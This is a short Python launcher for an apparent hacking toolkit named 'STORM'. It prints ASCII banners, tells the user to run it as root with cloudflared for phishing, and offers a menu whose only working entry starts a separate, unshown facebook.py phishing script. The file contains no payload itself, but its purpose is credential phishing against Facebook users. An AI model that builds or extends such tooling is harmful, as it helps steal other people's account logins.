import os
import subprocess
import time

print("REMEMBER TO RUN THIS AS ROOT USER AND HAVE CLOUDFLARED IF YOU WANT TO USE PHISHING")
time.sleep(3)

subprocess.run(["clear"])

print("███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗")
print("██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║")
print("███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║")
print("╚════██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║")
print("███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║")
print("╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝")
print("                                  version 1.1")
print("")
print("")
print("")
print("    [1] phishing")
print("")
print("    [2] coming soon")
print("")
print("")


while True:
    option = input("    choose an option: ")
    if option == "1":
        os.system("clear")

        print("███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗      ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ ")
        print("██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║      ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗")
        print("███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║      ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝")
        print("╚════██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║      ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗")
        print("███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║      ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║")
        print("╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝      ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝")
        print("                                                                                           version 1.0")
        print("")
        print("")
        print("    [1] facebook")
        print("")
        print("")
        print("")

        phishing_option = input("    choose an option: ")
        if phishing_option == "1":
            subprocess.run(["python", "facebook.py"])


        break

    elif option == "2":
        print("")
        print("")
        print("    [+] coming soon")
        print("")
        print("")
        print("")


